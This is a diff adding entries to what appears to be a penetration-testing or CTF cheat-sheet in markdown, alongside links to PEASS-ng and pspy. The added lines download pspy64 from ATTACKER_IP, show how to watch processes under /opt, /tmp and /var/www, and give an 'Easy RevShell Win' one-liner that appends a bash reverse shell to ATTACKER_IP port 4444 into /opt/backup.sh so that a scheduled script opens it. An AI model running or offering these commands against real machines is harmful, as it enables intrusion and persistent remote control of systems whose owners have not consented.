@@ -110,6 +110,25 @@ git clone https://github.com/peass-ng/PEASS-ng/releases/tag/20260306-5620909d
 
 ## PSPY link
 https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1
+### Commands:
+```
+wget http://ATTACKER_IP/pspy64
+chmod +x pspy64
+./pspy64
+```
+```
+./pspy64 -d /opt
+./pspy64 -d /opt -d /tmp -d /var/www
+```
+File Check:
+```
+./pspy64 -f
+```
+
+## Easy RevShell Win
+```
+echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/backup.sh
+```
 
 ## Write up
 
